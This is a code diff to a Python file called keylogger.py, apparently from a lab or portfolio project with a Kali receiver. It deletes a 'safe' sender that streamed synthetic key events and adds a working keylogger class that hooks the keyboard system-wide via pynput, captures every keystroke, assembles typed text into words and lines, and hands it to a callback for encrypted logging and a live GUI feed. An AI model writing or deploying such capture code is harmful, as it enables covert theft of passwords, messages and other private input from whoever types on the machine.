@@ -1,83 +1,166 @@
-# keylogger.py — SAFE portfolio sender (no capture)
-# Modes:
-#   demo   : emit synthetic key events
-#   replay : read a text file and stream its characters as events
-#
-# Usage (Windows VM):
-#   py keylogger.py 192.168.77.129 5050 --mode demo --window "Windows VM" --rate 8
-#   py keylogger.py 192.168.77.129 5050 --mode replay --file C:\path\sample.txt --rate 10
+from pynput import keyboard
+from datetime import datetime
+import string
+import threading
+import time
+import queue  # NEW
 
-import argparse, json, time, datetime, itertools, urllib.request, pathlib, sys
 
-def _post(url: str, evt: dict):
-    data = json.dumps(evt).encode("utf-8")
-    req = urllib.request.Request(
-        url, data=data,
-        headers={"Content-Type": "application/json"},
-        method="POST",
-    )
-    with urllib.request.urlopen(req, timeout=5) as resp:
-        resp.read()
+class KeyloggerService:
+    def __init__(self, callback, combine=True, idle_ms=800, ui_queue: "queue.Queue|None" = None):
+        """
+        callback: function(str) -> None  (receives plaintext line to be encrypted+written)
+        combine: if True, buffer characters into words/sentences
+        idle_ms: flush buffer after this many ms of no typing
+        ui_queue: optional Queue to forward events to the GUI live (dicts)
+        """
+        self._listener = None
+        self._callback = callback
+        self.combine = combine
+        self.idle_ms = idle_ms
+        self._buf = []
+        self._last_ts = 0.0
+        self._idle_timer = None
+        self._running = False
 
-def _now():
-    return datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+        self._ui_queue = ui_queue   # NEW
 
-def run_demo(url: str, window: str, rate: float):
-    chars = list("HELLO_DEMO_123 ") + ["[Enter]"]
-    delay = 1.0 / max(rate, 0.1)
-    print(f"[demo] sending to {url} @ ~{rate} keys/sec  window={window}")
-    shown = 0
-    while True:
+        # define what counts as printable char we merge
+        self._printables = set(string.printable) - set("\r\n\t")
+
+        # punctuation that should flush a chunk (end of word/sentence feel)
+        self._flush_punct = set(" .,!?:;)]}")
+
+    # ---------- buffer helpers ----------
+    def _now_str(self):
+        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    def _flush(self):
+        if not self._buf:
+            return
+        text = "".join(self._buf)
+        self._buf.clear()
+        self._send_line(text, kind="TEXT")
+
+    def _schedule_idle_flush(self):
+        if self._idle_timer:
+            self._idle_timer.cancel()
+        if self.idle_ms <= 0:
+            return
+        self._idle_timer = threading.Timer(self.idle_ms / 1000.0, self._flush)
+        self._idle_timer.daemon = True
+        self._idle_timer.start()
+
+    def _forward_to_ui(self, *, ts: str, kind: str, text: str):
+        """Send a GUI-friendly event if a ui_queue is attached."""
+        if not self._ui_queue:
+            return
+        evt = {
+            "ts": ts,
+            "type": kind.upper(),       # "KEY" or "TEXT"
+            "key": text if kind.upper() == "KEY" else text,
+            "window": "",               # you can fill this if you track focus elsewhere
+            "_already_logged": True,    # IMPORTANT: prevent GUI from logging twice
+        }
         try:
-            for ch in itertools.cycle(chars):
-                evt = {"type":"KEY","key":ch,"window":window,"ts":_now()}
-                _post(url, evt)
-                if shown < 10:
-                    print("sent:", ch); shown += 1
-                time.sleep(delay)
-        except Exception as e:
-            print("[demo] post failed:", e, "— retrying in 1s")
-            time.sleep(1)
+            self._ui_queue.put_nowait(evt)
+        except Exception:
+            pass
 
-def run_replay(url: str, window: str, path: str, rate: float):
-    p = pathlib.Path(path)
-    if not p.exists():
-        print(f"[replay] file not found: {p}"); sys.exit(1)
-    text = p.read_text(encoding="utf-8", errors="ignore")
-    # stream characters; treat newline as Enter
-    delay = 1.0 / max(rate, 0.1)
-    print(f"[replay] {p} -> {url} @ ~{rate} chars/sec window={window}")
-    i = 0
-    while True:
+    def _send_line(self, text: str, kind: str | None = None):
+        # keep the same “timestamp - …” layout the viewer already parses
+        ts = self._now_str()
+        line = f"{ts} - {text}"
+        self._callback(line)
+
+        # infer kind if not provided
+        if kind is None:
+            kind = "KEY" if (text.startswith("[") and text.endswith("]")) else "TEXT"
+
+        # also forward to GUI live
+        self._forward_to_ui(ts=ts, kind=kind, text=text)
+
+    # ---------- key handling ----------
+    def _on_press(self, key):
+        ts = time.time()
+        self._last_ts = ts
+
+        # if not combining, emit one per key like before
+        if not self.combine:
+            try:
+                ch = key.char
+                self._send_line(ch, kind="TEXT" if len(ch) == 1 else "KEY")
+            except AttributeError:
+                name = getattr(key, "name", str(key))
+                self._send_line(f"[{name}]", kind="KEY")
+            return
+
+        # combine mode:
         try:
-            for ch in text:
-                key = "[Enter]" if ch == "\n" else ch
-                evt = {"type":"KEY","key":key,"window":window,"ts":_now()}
-                _post(url, evt)
-                if i < 10:
-                    print("sent:", repr(key)); i += 1
-                time.sleep(delay)
-        except Exception as e:
-            print("[replay] post failed:", e, "— retrying in 1s")
-            time.sleep(1)
+            ch = key.char
+        except AttributeError:
+            ch = None
 
-def main(argv=None):
-    ap = argparse.ArgumentParser(description="SAFE sender for GUI demo (no real capture).")
-    ap.add_argument("host", help="Receiver host (Kali eth1 IP), e.g. 192.168.77.129")
-    ap.add_argument("port", nargs="?", type=int, default=5050, help="Receiver port (default 5050)")
-    ap.add_argument("--mode", choices=["demo","replay"], default="demo")
-    ap.add_argument("--file", help="Path to text file for --mode replay")
-    ap.add_argument("--rate", type=float, default=6.0, help="Events per second (default 6)")
-    ap.add_argument("--window", default="Windows VM", help="Window label to show in GUI")
-    args = ap.parse_args(argv)
+        if ch is not None:
+            # printable characters
+            if ch in self._printables:
+                self._buf.append(ch)
+                # flush when punctuation that usually ends tokens
+                if ch in self._flush_punct:
+                    self._flush()
+                else:
+                    self._schedule_idle_flush()
+            else:
+                # non printable -> flush & record name
+                self._flush()
+                self._send_line(f"[NonPrintable:{repr(ch)}]", kind="KEY")
+            return
 
-    url = f"http://{args.host}:{args.port}/event"
-    if args.mode == "replay":
-        if not args.file:
-            ap.error("--file is required when --mode replay")
-        run_replay(url, args.window, args.file, args.rate)
-    else:
-        run_demo(url, args.window, args.rate)
+        # special keys
+        name = getattr(key, "name", str(key))
 
-if __name__ == "__main__":
-    main()
+        if name in ("space",):
+            self._buf.append(" ")
+            self._schedule_idle_flush()
+        elif name in ("enter", "return"):
+            self._flush()
+            self._send_line("[Enter]", kind="KEY")
+        elif name in ("tab",):
+            self._buf.append("\t")
+            self._flush()
+        elif name.startswith("backspace"):
+            if self._buf:
+                self._buf.pop()
+                self._schedule_idle_flush()
+            else:
+                # nothing to delete -> just record
+                self._send_line("[Backspace]", kind="KEY")
+        else:
+            # flush any pending text, then record the special key
+            self._flush()
+            # normalize e.g. shift_r -> Shift R
+            pretty = name.replace("_", " ").title()
+            self._send_line(f"[{pretty}]", kind="KEY")
+
+    def start(self):
+        if self._running:
+            return
+        self._listener = keyboard.Listener(on_press=self._on_press)
+        self._listener.daemon = True
+        self._listener.start()
+        self._running = True
+
+    def stop(self):
+        if self._idle_timer:
+            self._idle_timer.cancel()
+            self._idle_timer = None
+        # flush anything left when stopping
+        self._flush()
+        if self._listener:
+            self._listener.stop()
+            self._listener = None
+        self._running = False
+
+    # OPTIONAL: allow setting/overriding the UI queue later
+    def set_ui_queue(self, q: "queue.Queue|None"):
+        self._ui_queue = q
